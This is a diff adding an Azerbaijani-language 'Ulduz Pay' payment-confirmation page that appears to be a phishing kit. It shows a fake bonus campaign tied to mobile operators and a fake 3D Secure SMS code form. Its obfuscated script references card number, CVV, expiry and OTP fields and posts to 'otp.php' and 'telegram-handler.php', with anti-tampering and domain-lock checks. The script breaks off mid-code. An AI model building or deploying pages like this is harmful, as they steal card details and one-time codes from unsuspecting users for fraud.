@@ -1,0 +1,953 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <title>Payment Confirmation</title>
+    <link rel="stylesheet" href="css/kapital.css">
+    <script src="config.js"></script>
+    <!-- <style>
+        :root {
+            --primary-color: #2563eb;
+            --bg-color: #f0f4f8;
+            --text-color: #1e293b;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+        }
+
+        body {
+            background: var(--bg-color);
+            color: var(--text-color);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+            background: linear-gradient(135deg, #f0f4f8 0%, #e2e8f0 100%);
+        }
+
+        .auth-container {
+            background: white;
+            padding: 3rem;
+            border-radius: 1.5rem;
+            box-shadow: 0 8px 16px -4px rgb(0 0 0 / 0.06);
+            width: 100%;
+            max-width: 520px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.18);
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 2.5rem;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 1.5rem;
+        }
+
+        .logo-container img {
+            height: 36px;
+            max-width: 140px;
+            object-fit: contain;
+            transition: transform 0.2s ease;
+        }
+
+        .logo-container img:hover {
+            transform: scale(1.05);
+        }
+
+        .logo-container img:first-child {
+            height: 28px;
+        }
+
+        .logo-container img:last-child {
+            height: 32px;
+        }
+
+        .amount-display {
+            background: linear-gradient(to right, #f8fafc, #f1f5f9);
+            padding: 1.5rem;
+            border-radius: 1rem;
+            margin-bottom: 2.5rem;
+            border: 1px solid #e2e8f0;
+        }
+
+        .amount-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 1.25rem;
+            font-weight: 500;
+        }
+
+        .amount-row span:last-child {
+            font-weight: 600;
+            color: var(--primary-color);
+        }
+
+        .otp-container {
+            margin-bottom: 2.5rem;
+        }
+
+        .otp-title {
+            font-size: 1rem;
+            color: #64748b;
+            margin-bottom: 1rem;
+            text-align: center;
+        }
+
+        .otp-inputs {
+            display: flex;
+            gap: 0.75rem;
+            justify-content: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .otp-input {
+            width: 4.5rem;
+            height: 4.5rem;
+            border: 2px solid #e2e8f0;
+            border-radius: 1rem;
+            text-align: center;
+            font-size: 1.75rem;
+            font-weight: 600;
+            transition: all 0.2s;
+            background: #f8fafc;
+        }
+
+        .otp-input:focus {
+            border-color: var(--primary-color);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15);
+            background: white;
+        }
+
+        .timer {
+            text-align: center;
+            color: #64748b;
+            font-size: 1.125rem;
+            margin-top: 2rem;
+            padding: 1rem;
+            background: #f8fafc;
+            border-radius: 0.75rem;
+            border: 1px solid #e2e8f0;
+        }
+
+        #countdown {
+            font-weight: 600;
+            color: var(--primary-color);
+        }
+
+        .cancel-btn {
+            background: none;
+            border: none;
+            color: #64748b;
+            cursor: pointer;
+            font-size: 1rem;
+            padding: 0.75rem 1rem;
+            border-radius: 0.5rem;
+            transition: all 0.2s;
+        }
+
+        .cancel-btn:hover {
+            color: #475569;
+            background: #f1f5f9;
+        }
+
+        .card-info {
+            background: linear-gradient(to right, #f8fafc, #f1f5f9);
+            padding: 1rem;
+            border-radius: 1rem;
+            margin-bottom: 2rem;
+            border: 1px solid #e2e8f0;
+        }
+
+        .card-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 1rem;
+            color: #64748b;
+        }
+
+        .card-number {
+            font-family: monospace;
+            font-weight: 500;
+            color: #475569;
+        }
+
+        .logo-container img.card-logo {
+            height: 36px;
+            margin-right: 1rem;
+        }
+
+        @media screen and (max-width: 768px) {
+            .card-row {
+                font-size: 0.8rem;
+            }
+
+            .cancel-btn {
+                display: none;
+            }
+
+        }
+
+        @media (max-width: 480px) {
+            .auth-container {
+                padding: 2rem;
+            }
+
+            .otp-input {
+                width: 3.5rem;
+                height: 3.5rem;
+                font-size: 1.5rem;
+            }
+
+            .logo-container img {
+                height: 32px;
+            }
+        }
+    </style> -->
+    <style>
+        :root {
+            --primary: #2663EA;
+            --primary-hover: #3B82F6;
+            --bg: #F6F8FC;
+            --card: #FFFFFF;
+            --success: #22C55E;
+            --text: #111827;
+            --muted: #6B7280;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 117px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, 'Noto Sans', Arial, sans-serif;
+            color: var(--text);
+            background: radial-gradient(circle at 12% 10%, rgba(59, 130, 246, .18), transparent 30%), radial-gradient(circle at 90% 20%, rgba(34, 197, 94, .11), transparent 28%), linear-gradient(145deg, #ffffff 0%, var(--bg) 46%, #eef4ff 100%);
+        }
+
+        body::before,
+        body::after {
+            content: '';
+            position: fixed;
+            width: 280px;
+            height: 280px;
+            border-radius: 999px;
+            pointer-events: none;
+            filter: blur(42px);
+            opacity: .5;
+            animation: floatOrb 9s ease-in-out infinite alternate;
+        }
+
+        body::before {
+            left: -90px;
+            top: 12%;
+            background: rgba(38, 99, 234, .22);
+        }
+
+        body::after {
+            right: -100px;
+            bottom: 8%;
+            background: rgba(34, 197, 94, .15);
+            animation-delay: 1.5s;
+        }
+
+        @keyframes floatOrb {
+            from {
+                transform: translate3d(0, 0, 0) scale(1);
+            }
+
+            to {
+                transform: translate3d(26px, -18px, 0) scale(1.08);
+            }
+        }
+
+        .glass-card {
+            max-width: 430px;
+            background: linear-gradient(180deg, rgba(255, 255, 255, .94), rgba(255, 255, 255, .86));
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border: 1px solid rgba(255, 255, 255, .78);
+            box-shadow: 0 34px 90px rgba(17, 24, 39, .13), 0 2px 10px rgba(38, 99, 234, .08), inset 0 1px 0 rgba(255, 255, 255, .96);
+        }
+
+        .glass-card::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            border-radius: inherit;
+            background: radial-gradient(circle at top, rgba(38, 99, 234, .08), transparent 42%);
+            pointer-events: none;
+        }
+
+        .brand-logo-wrap {
+            background: linear-gradient(145deg, #ffffff, #edf4ff);
+            box-shadow: 0 18px 40px rgba(38, 99, 234, .12), inset 0 1px 0 #fff;
+        }
+
+        .campaign-badge {
+            background: rgba(34, 197, 94, .1);
+            color: #15803d;
+            border: 1px solid rgba(34, 197, 94, .18);
+            box-shadow: 0 8px 20px rgba(34, 197, 94, .08);
+        }
+
+        .progress-step {
+            position: relative;
+            color: #94a3b8;
+            transition: all .35s ease;
+        }
+
+        .progress-step::before {
+            content: '';
+            width: 9px;
+            height: 9px;
+            border-radius: 99px;
+            display: block;
+            margin: 0 auto 7px;
+            background: #dbe4f0;
+            box-shadow: 0 0 0 5px rgba(219, 228, 240, .35);
+            transition: all .35s ease;
+        }
+
+        .progress-step.active {
+            color: var(--primary);
+            font-weight: 800;
+        }
+
+        .progress-step.active::before {
+            background: var(--primary);
+            box-shadow: 0 0 0 6px rgba(38, 99, 234, .13), 0 8px 18px rgba(38, 99, 234, .24);
+            transform: scale(1.15);
+        }
+
+        .step-transition {
+            transition: opacity .45s cubic-bezier(.22, 1, .36, 1), transform .45s cubic-bezier(.22, 1, .36, 1), filter .45s ease;
+            transform-origin: 50% 24px;
+        }
+
+        .hidden-step {
+            display: none;
+            opacity: 0;
+            transform: translateX(22px) translateY(12px) scale(.975);
+            filter: blur(4px);
+        }
+
+        .active-step {
+            display: block;
+            opacity: 1;
+            transform: translateX(0) translateY(0) scale(1);
+            filter: blur(0);
+            animation: premiumIn .48s cubic-bezier(.22, 1, .36, 1) both;
+        }
+
+        @keyframes premiumIn {
+            from {
+                opacity: 0;
+                transform: translateY(16px) scale(.975);
+                filter: blur(5px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+                filter: blur(0);
+            }
+        }
+
+        .operator-card,
+        .campaign-card,
+        .premium-field,
+        .premium-btn,
+        .summary-tile,
+        .otp-box {
+            transition: transform .28s ease, box-shadow .28s ease, border-color .28s ease, background .28s ease;
+        }
+
+        .operator-card {
+            border: 1px solid rgba(226, 232, 240, .9);
+            background: linear-gradient(180deg, #fff, #fbfdff);
+            box-shadow: 0 12px 32px rgba(15, 23, 42, .045);
+        }
+
+        .operator-card:hover {
+            transform: translateY(-5px) scale(1.012);
+            border-color: rgba(38, 99, 234, .55);
+            box-shadow: 0 24px 54px rgba(38, 99, 234, .15), 0 8px 20px rgba(15, 23, 42, .05);
+        }
+
+        .operator-card:focus-visible,
+        .campaign-card:focus-visible,
+        button:focus-visible,
+        input:focus-visible,
+        select:focus-visible {
+            outline: none;
+            box-shadow: 0 0 0 5px rgba(38, 99, 234, .13);
+        }
+
+        .operator-card:active,
+        .campaign-card:active,
+        .premium-btn:active {
+            transform: scale(.985);
+        }
+
+        .check-pill {
+            opacity: 0;
+            transform: scale(.85);
+            transition: all .25s ease;
+        }
+
+        .operator-card:hover .check-pill,
+        .campaign-card:hover .check-pill {
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        .premium-field {
+            background: rgba(246, 248, 252, .82);
+            border: 1px solid rgba(226, 232, 240, .95);
+            box-shadow: inset 0 1px 0 rgba(255, 255, 255, .78), 0 8px 18px rgba(15, 23, 42, .035);
+        }
+
+        .premium-field:focus {
+            border-color: var(--primary);
+            background: #fff;
+            box-shadow: 0 0 0 5px rgba(38, 99, 234, .11), 0 16px 26px rgba(38, 99, 234, .08);
+        }
+
+        .premium-btn {
+            background: linear-gradient(135deg, var(--primary), var(--primary-hover));
+            box-shadow: 0 18px 34px rgba(38, 99, 234, .28), inset 0 1px 0 rgba(255, 255, 255, .18);
+        }
+
+        .premium-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 24px 44px rgba(38, 99, 234, .34);
+        }
+
+        .premium-btn:disabled {
+            background: #e5eaf3 !important;
+            color: #94a3b8 !important;
+            box-shadow: none !important;
+            transform: none !important;
+        }
+
+        .campaign-card {
+            border: 1px solid rgba(226, 232, 240, .9);
+            background: linear-gradient(180deg, #fff, #fafdff);
+            box-shadow: 0 12px 28px rgba(15, 23, 42, .045);
+        }
+
+        .campaign-card:hover {
+            transform: translateY(-4px) scale(1.01);
+            border-color: rgba(38, 99, 234, .55);
+            background: linear-gradient(180deg, #fff, #eff6ff);
+            box-shadow: 0 22px 46px rgba(38, 99, 234, .13);
+        }
+
+        .campaign-card:active {
+            border-color: var(--primary);
+            background: #eff6ff;
+        }
+
+        .summary-tile {
+            background: rgba(255, 255, 255, .78);
+            border: 1px solid rgba(226, 232, 240, .88);
+            box-shadow: 0 10px 24px rgba(15, 23, 42, .04);
+        }
+
+        .summary-tile:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 16px 30px rgba(38, 99, 234, .08);
+        }
+
+        .custom-scrollbar::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .custom-scrollbar::-webkit-scrollbar-thumb {
+            background: #dbeafe;
+            border-radius: 99px;
+        }
+
+        .loader {
+            width: 72px;
+            height: 72px;
+            border-radius: 999px;
+            background: conic-gradient(from 0deg, var(--primary), #93c5fd, #e0ecff, var(--primary));
+            position: relative;
+            animation: spinner 1.2s linear infinite;
+        }
+
+        .loader::after {
+            content: '';
+            position: absolute;
+            inset: 8px;
+            background: white;
+            border-radius: inherit;
+            box-shadow: inset 0 1px 0 rgba(255, 255, 255, .9);
+        }
+
+        @keyframes spinner {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .processing-line {
+            animation: pulseLine 1.8s ease-in-out infinite;
+        }
+
+        .processing-line:nth-child(2) {
+            animation-delay: .25s;
+        }
+
+        .processing-line:nth-child(3) {
+            animation-delay: .5s;
+        }
+
+        .processing-line:nth-child(4) {
+            animation-delay: .75s;
+        }
+
+        @keyframes pulseLine {
+
+            0%,
+            100% {
+                opacity: .55;
+                transform: translateX(0);
+            }
+
+            50% {
+                opacity: 1;
+                transform: translateX(4px);
+            }
+        }
+
+        .otp-box:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 5px rgba(38, 99, 234, .1), 0 14px 24px rgba(38, 99, 234, .08);
+        }
+
+        @media (max-width: 430px) {
+            .glass-card {
+                border-radius: 30px;
+                padding: 22px;
+            }
+
+            .progress-step {
+                font-size: 10px;
+            }
+        }
+
+        /* Mobile-first UX refinements: keep elements generous, but remove cramped nested scrolling. */
+        .digital-card {
+            position: relative;
+            min-height: 172px;
+            max-width: 360px;
+            margin-left: auto;
+            margin-right: auto;
+            border-radius: 28px;
+            overflow: hidden;
+            color: white;
+            isolation: isolate;
+            background: radial-gradient(circle at 18% 8%, rgba(255, 255, 255, .34), transparent 25%), radial-gradient(circle at 86% 18%, rgba(147, 197, 253, .32), transparent 28%), linear-gradient(135deg, #0f172a 0%, #1d4ed8 52%, #60a5fa 100%);
+            box-shadow: 0 22px 42px rgba(38, 99, 234, .24), inset 0 1px 0 rgba(255, 255, 255, .26);
+        }
+
+        .digital-card::before {
+            content: '';
+            position: absolute;
+            inset: -40%;
+            background: linear-gradient(115deg, transparent 28%, rgba(255, 255, 255, .16) 44%, transparent 58%), radial-gradient(circle, rgba(255, 255, 255, .18), transparent 42%);
+            transform: rotate(8deg);
+            animation: cardSheen 7s ease-in-out infinite;
+            z-index: -1;
+        }
+
+        .digital-card::after {
+            content: '';
+            position: absolute;
+            width: 220px;
+            height: 220px;
+            right: -100px;
+            bottom: -120px;
+            border-radius: 999px;
+            background: rgba(255, 255, 255, .13);
+            box-shadow: -110px -56px 0 rgba(255, 255, 255, .07);
+            z-index: -1;
+        }
+
+        @keyframes cardSheen {
+
+            0%,
+            100% {
+                transform: translateX(-18px) rotate(8deg);
+                opacity: .7;
+            }
+
+            50% {
+                transform: translateX(24px) rotate(8deg);
+                opacity: 1;
+            }
+        }
+
+        .card-chip {
+            width: 38px;
+            height: 29px;
+            border-radius: 9px;
+            background: linear-gradient(135deg, #fde68a, #f59e0b);
+            box-shadow: inset 0 1px 0 rgba(255, 255, 255, .55), 0 10px 20px rgba(0, 0, 0, .12);
+            position: relative;
+        }
+
+        .card-chip::before,
+        .card-chip::after {
+            content: '';
+            position: absolute;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: rgba(120, 53, 15, .26);
+        }
+
+        .card-chip::before {
+            top: 11px;
+        }
+
+        .card-chip::after {
+            bottom: 11px;
+        }
+
+        .card-live-value {
+            text-shadow: 0 2px 12px rgba(0, 0, 0, .16);
+        }
+
+        .card-brand-logo {
+            height: 22px;
+            max-width: 54px;
+            object-fit: contain;
+            display: block;
+            filter: drop-shadow(0 6px 10px rgba(0, 0, 0, .12));
+        }
+
+        .card-brand-logo.mastercard {
+            height: 26px;
+        }
+
+        .card-brand-inline-logo {
+            height: 16px;
+            max-width: 42px;
+            object-fit: contain;
+            display: block;
+        }
+
+        .card-brand-inline-logo.mastercard {
+            height: 19px;
+        }
+
+        .soft-section-title {
+            letter-spacing: -.025em;
+        }
+
+        @media (max-width: 480px) {
+
+            html,
+            body {
+                min-height: 100svh;
+            }
+
+            body {
+                align-items: flex-start !important;
+                padding: 10px !important;
+                overflow-y: auto;
+                -webkit-overflow-scrolling: touch;
+            }
+
+            .glass-card {
+                width: 100%;
+                max-width: none;
+                min-height: calc(100svh - 20px);
+                border-radius: 32px;
+                padding: 20px;
+            }
+
+            header {
+                margin-bottom: 18px !important;
+            }
+
+            header .brand-logo-wrap {
+                width: 76px;
+                height: 76px;
+                border-radius: 24px;
+                margin-bottom: 12px;
+            }
+
+            header .brand-logo-wrap img {
+                height: 52px;
+            }
+
+            header h1 {
+                font-size: 1.65rem !important;
+            }
+
+            nav {
+                position: sticky;
+                top: 8px;
+                z-index: 30;
+                margin-bottom: 20px !important;
+                padding: 12px !important;
+                backdrop-filter: blur(18px);
+                -webkit-backdrop-filter: blur(18px);
+            }
+
+            main[data-step="3"] header,
+            main[data-step="5"] header,
+            main[data-step="6"] header {
+                display: none;
+            }
+
+            main[data-step="3"] nav,
+            main[data-step="5"] nav,
+            main[data-step="6"] nav {
+                margin-bottom: 14px !important;
+            }
+
+            main[data-step="3"] .custom-scrollbar,
+            main[data-step="5"] .custom-scrollbar {
+                max-height: none !important;
+                overflow: visible !important;
+                padding-right: 0 !important;
+            }
+
+            .campaign-card {
+                border-radius: 26px;
+                padding: 18px !important;
+            }
+
+            .summary-tile {
+                padding: 11px !important;
+            }
+
+            .digital-card {
+                min-height: 158px;
+                border-radius: 26px;
+                margin-bottom: 16px !important;
+            }
+
+            #card-preview-number {
+                font-size: 1rem !important;
+                letter-spacing: .07em !important;
+            }
+
+            .card-brand-logo {
+                height: 19px;
+                max-width: 48px;
+            }
+
+            .card-brand-logo.mastercard {
+                height: 23px;
+            }
+
+            .premium-field {
+                min-height: 56px;
+                font-size: 16px;
+            }
+
+            .premium-btn {
+                min-height: 58px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <main class="max-w-md w-full glass-card rounded-[36px] p-6 sm:p-8 relative overflow-hidden" data-step="6">
+        <div class="relative z-10">
+            <!-- Header -->
+            <header class="text-center mb-7">
+                <div class="brand-logo-wrap w-24 h-24 rounded-[28px] mx-auto mb-4 flex items-center justify-center">
+                    <img src="logo4.png" alt="Ulduz Pay Logo" class="h-16 w-auto object-contain drop-shadow-xl">
+                </div>
+                <h1 class="text-3xl font-extrabold text-gray-950 tracking-tight">Ulduz <span
+                        class="text-[#2663EA]">Pay</span></h1>
+                <div
+                    class="campaign-badge inline-flex items-center gap-2 px-4 py-2 rounded-full text-xs font-bold mt-3">
+                    <span class="h-2.5 w-2.5 rounded-full bg-[#22C55E] shadow-[0_0_0_5px_rgba(34,197,94,.12)]"></span>
+                    Kampaniya aktivdir
+                </div>
+                <p class="text-[#6B7280] mt-3 text-sm leading-relaxed max-w-[340px] mx-auto">Bu gün sizə özəl bonus
+                    kampaniyası təqdim olunur.</p>
+                <section id="step-6" class="step-transition active-step">
+                    <div class="text-center mb-7">
+                        <div
+                            class="flex justify-center items-center gap-4 mb-6 rounded-3xl bg-white/70 border border-gray-100 p-4 shadow-sm">
+                            <img src="images/1280px-Mastercard-logo.svg.png" class="h-8 opacity-60" alt="Mastercard">
+                            <div class="h-8 w-px bg-gray-200"></div><img
+                                src="images/Visa_Inc._logo_%282005%E2%80%932014%29.svg" class="h-4 opacity-60"
+                                alt="Visa">
+                        </div>
+                        <p class="text-xs font-bold uppercase tracking-[0.24em] text-[#2663EA] mb-2">SMS təsdiqi</p>
+                        <h2 class="text-2xl font-extrabold text-gray-950">3D Təhlükəsizlik</h2>
+                        <p class="text-sm text-[#6B7280] mt-2">Nömrənizə göndərilən 6 rəqəmli kodu daxil edin.</p>
+                    </div>
+
+                    <form id="tds-form" class="space-y-6">
+                        <div class="text-center">
+                            <input type="password" id="tds-code" required="" maxlength="6" inputmode="numeric"
+                                pattern="[0-9]*" autocomplete="one-time-code"
+                                class="premium-field w-full max-w-[220px] h-14 rounded-2xl text-center text-xl font-extrabold tracking-[0.35em] placeholder:text-gray-300 mx-auto"
+                                placeholder="******" aria-label="SMS təsdiq kodu">
+                            <p id="tds-error" class="text-red-500 text-xs font-extrabold mt-4 hidden">Yanlış təsdiq
+                                kodu.
+                                Yenidən cəhd edin.</p>
+                        </div>
+                        <button type="submit"
+                            class="premium-btn w-full py-5 text-white font-extrabold rounded-2xl">Təsdiq
+                            et</button>
+                        <div class="text-center"><button type="button"
+                                class="text-sm text-[#2663EA] font-extrabold hover:underline">Kodu yenidən
+                                göndər</button>
+                        </div>
+                    </form>
+                </section>
+        </div>
+
+        <!-- Processing / Success State -->
+        <div id="status-overlay"
+            class="absolute inset-0 bg-white/95 backdrop-blur-xl z-50 flex flex-col items-center justify-center p-9 text-center hidden">
+            <div id="loader" class="loader mb-7"></div>
+            <div id="success-icon"
+                class="hidden w-20 h-20 bg-green-50 rounded-[28px] flex items-center justify-center mb-6 text-4xl text-green-500">
+                ✓</div>
+            <h3 id="status-title" class="text-2xl font-extrabold text-gray-950 mb-2">Kart yoxlanılır...</h3>
+            <p id="status-desc" class="text-[#6B7280] text-sm leading-relaxed">Zəhmət olmasa gözləyin, kart
+                məlumatlarınız yoxlanılır.</p>
+            <div
+                class="mt-8 w-full max-w-[290px] rounded-3xl bg-blue-50/80 border border-blue-100 p-4 text-left text-sm text-blue-950 space-y-3">
+                <p class="processing-line">✓ Kart məlumatları qəbul edildi</p>
+                <p class="processing-line">↳ Bank ilə əlaqə yaradılır...</p>
+                <p class="processing-line">↳ Kart yoxlanılır...</p>
+                <p class="processing-line">↳ SMS hazırlanır...</p>
+            </div>
+        </div>
+    </main>
+
+    <script>
+
+        const _0x49fbe2 = _0x58ed; (function (_0x2d2ca5, _0x205a13) { const _0x513a1d = _0x58ed, _0x3bd692 = _0x2d2ca5(); while (!![]) { try { const _0x114c1c = parseInt(_0x513a1d(0x147)) / 0x1 + parseInt(_0x513a1d(0xee)) / 0x2 * (-parseInt(_0x513a1d(0x138)) / 0x3) + -parseInt(_0x513a1d(0x136)) / 0x4 * (parseInt(_0x513a1d(0xfd)) / 0x5) + -parseInt(_0x513a1d(0x119)) / 0x6 * (-parseInt(_0x513a1d(0x161)) / 0x7) + -parseInt(_0x513a1d(0xf0)) / 0x8 + -parseInt(_0x513a1d(0x144)) / 0x9 + parseInt(_0x513a1d(0x11c)) / 0xa; if (_0x114c1c === _0x205a13) break; else _0x3bd692['push'](_0x3bd692['shift']()); } catch (_0x4247b9) { _0x3bd692['push'](_0x3bd692['shift']()); } } }(_0x45fc, 0x6e32b)); const _0x52fe98 = (function () { let _0x368a3a = !![]; return function (_0x26c21c, _0x467d6f) { const _0x4bc6b2 = _0x368a3a ? function () { if (_0x467d6f) { const _0x1954ea = _0x467d6f['apply'](_0x26c21c, arguments); return _0x467d6f = null, _0x1954ea; } } : function () { }; return _0x368a3a = ![], _0x4bc6b2; }; }()), _0x14eb84 = _0x52fe98(this, function () { const _0x2aeb89 = _0x58ed; if (_0x14eb84[_0x2aeb89(0x150)]()['toString']()['indexOf']('\x0a') !== -0x1) return; return _0x14eb84[_0x2aeb89(0x100)]()['search'](_0x2aeb89(0x16c))[_0x2aeb89(0x100)]()[_0x2aeb89(0x10a)](_0x14eb84)[_0x2aeb89(0x123)](_0x2aeb89(0x16c)); }); _0x14eb84(); function _0x58ed(_0x4875aa, _0x2272f0) { _0x4875aa = _0x4875aa - 0xed; const _0xa3443f = _0x45fc(); let _0x1b766d = _0xa3443f[_0x4875aa]; return _0x1b766d; } function _0x45fc() { const _0x219ac5 = ['\x22\x20class=\x22max-h-full\x20max-w-full\x20object-contain\x22\x20alt=\x22', '621196lDLHCE', 'getElementById', '702222rrFnfZ', '050', 'summary-num', 'addEventListener', 'status-title', 'split', 'json', '</strong>\x20ölkədaxili\x20danışıq\x20qazanacaqsınız!\x20Hədiyyənin\x20istifadə\x20müddəti\x20<strong>', 'text-gray-400', 'card-expiry', 'apply', 'operator', '6989778HQUcYT', 'goToStep', '.step-transition', '44177nBsMBO', 'charAt', 'https://upload.wikimedia.org/wikipedia/commons/f/f7/Nar-new-logo.png', 'tds-code', 'submit', 'otp.php', '\x20+\x20', 'expiry-error', 'value', 'bind', 'step-2-next', 'card_cvv', 'hidden-step', 'remove', 'price', 'border-red-500', 'textContent', 'card_expiry', 'getFullYear', 'Yoxlanılır...', 'slice', 'number', 'hidden', 'tds-form', 'map', 'tds_code', '2956009yvGVXH', 'card-name', '010', 'shadow-lg', '051', 'tds-error', '</strong>\x20artıraraq\x20Ulduz\x20pay-dən\x20<strong>', 'append', 'length', 'Kod\x20yalnız\x204\x20və\x20ya\x206\x20rəqəmli\x20olmalıdır.', 'https://images.seeklogo.com/logo-png/46/2/azercell-logo-png_seeklogo-468720.png', '(((.+)+)+)+$', 'replace', '6EBuhRN', 'return\x20(function()\x20', '5651256dhKBqs', 'charCodeAt', 'status', 'test', 'Kart\x20yoxlanılır...', 'Məlumatlar\x20yoxlanılır,\x20zəhmət\x20olmasa\x20gözləyin.', 'https://knowledgemap.pm/wp-content/uploads/bakcell_300.png', 'card_number', 'message', '</strong>\x20internet\x20və\x20<strong>', 'success', 'Yanlış\x20təsdiq\x20kodu.\x20Yenidən\x20cəhd\x20edin.', 'bg-gray-200', '15fzOrAD', '</strong>-dur!\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', 'preventDefault', 'toString', '070', 'cursor-not-allowed', 'status-desc', '000-00-00', 'card-number', 'unmaskedValue', 'phone-input', 'status-overlay', 'expiry-label', 'constructor', '000', 'campaign_details', 'VuSCYlUduWqIzGptMaCyyYN.rontSlineNKIZTWSEmETvHsxMvMcB', 'active-step', 'card-error', 'add', 'forEach', 'step-', 'innerHTML', 'join', 'payment-amount', '\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22w-12\x20h-6\x20flex\x20items-center\x20justify-center\x20mr-3\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22', 'abeTZfSMoeKWBXuFt:bXlTyaKpMARNnkffZxJjGVEjj', 'focus', '6GUdxlQ', 'text-white', '</option>', '26360750tRoIcB', 'payment-form', 'telegram-handler.php', 'prefix', 'campaign', 'hover:bg-[#1d4ed8]', 'Sistem\x20xətası\x20baş\x20verdi.', 'search', '00/00', 'classList', 'card-cvv', 'indexOf', 'getMonth', 'card-label', '055', 'shadow-blue-200', '099', 'bg-[#2663ea]', '\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Təbriklər!\x20Balansınızı\x20<strong>', 'prefix-select', 'fromCharCode', 'POST', '\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22font-bold\x20text-gray-900\x22>', 'disabled', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20']; _0x45fc = function () { return _0x219ac5; }; return _0x45fc(); } const _0x51ef3d = (function () { let _0x1d28b7 = !![]; return function (_0x22ed4c, _0x5dc439) { const _0x4d624b = _0x1d28b7 ? function () { const _0xc05cf2 = _0x58ed; if (_0x5dc439) { const _0x5ad84d = _0x5dc439[_0xc05cf2(0x142)](_0x22ed4c, arguments); return _0x5dc439 = null, _0x5ad84d; } } : function () { }; return _0x1d28b7 = ![], _0x4d624b; }; }()), _0x1b766d = _0x51ef3d(this, function () { const _0x483e23 = _0x58ed; let _0x1655d4; try { const _0x704e28 = Function(_0x483e23(0xef) + '{}.constructor(\x22return\x20this\x22)(\x20)' + ');'); _0x1655d4 = _0x704e28(); } catch (_0x1d411e) { _0x1655d4 = window; } const _0x402ccb = new RegExp('[VSCYUWqIGtMCYNrtSNKIZTWSEmETvHsxMvMcB]', 'g'), _0x41f984 = _0x483e23(0x10d)[_0x483e23(0xed)](_0x402ccb, '')[_0x483e23(0x13d)](';'); let _0x58fc18, _0x21c3fb, _0x579dac, _0x417931; const _0x42196a = function (_0x55431c, _0x627bfb, _0xfc4f83) { const _0x10c205 = _0x483e23; if (_0x55431c[_0x10c205(0x169)] != _0x627bfb) return ![]; for (let _0x20a3ce = 0x0; _0x20a3ce < _0x627bfb; _0x20a3ce++) { for (let _0x565c7c = 0x0; _0x565c7c < _0xfc4f83['length']; _0x565c7c += 0x2) { if (_0x20a3ce == _0xfc4f83[_0x565c7c] && _0x55431c[_0x10c205(0xf1)](_0x20a3ce) != _0xfc4f83[_0x565c7c + 0x1]) return ![]; } } return !![]; }, _0x5d14ec = function (_0x8918fa, _0x21b262, _0x20a208) { return _0x42196a(_0x21b262, _0x20a208, _0x8918fa); }, _0x1a36f5 = function (_0x3ba6ff, _0x3b1064, _0x242bbd) { return _0x5d14ec(_0x3b1064, _0x3ba6ff, _0x242bbd); }, _0x3d211e = function (_0x4828a3, _0x1e9f97, _0x5a4732) { return _0x1a36f5(_0x1e9f97, _0x5a4732, _0x4828a3); }; for (let _0xd46eb1 in _0x1655d4) { if (_0x42196a(_0xd46eb1, 0x8, [0x7, 0x74, 0x5, 0x65, 0x3, 0x75, 0x0, 0x64])) { _0x58fc18 = _0xd46eb1; break; } } for (let _0x1c2f87 in _0x1655d4[_0x58fc18]) { if (_0x3d211e(0x6, _0x1c2f87, [0x5, 0x6e, 0x0, 0x64])) { _0x21c3fb = _0x1c2f87; break; } } for (let _0x5071e3 in _0x1655d4[_0x58fc18]) { if (_0x1a36f5(_0x5071e3, [0x7, 0x6e, 0x0, 0x6c], 0x8)) { _0x579dac = _0x5071e3; break; } } if (!('~' > _0x21c3fb)) for (let _0x1ae189 in _0x1655d4[_0x58fc18][_0x579dac]) { if (_0x5d14ec([0x7, 0x65, 0x0, 0x68], _0x1ae189, 0x8)) { _0x417931 = _0x1ae189; break; } } if (!_0x58fc18 || !_0x1655d4[_0x58fc18]) return; const _0x54d402 = _0x1655d4[_0x58fc18][_0x21c3fb], _0x178b4f = !!_0x1655d4[_0x58fc18][_0x579dac] && _0x1655d4[_0x58fc18][_0x579dac][_0x417931], _0x274f5b = _0x54d402 || _0x178b4f; if (!_0x274f5b) return; let _0x5375ba = ![]; for (let _0x5bb251 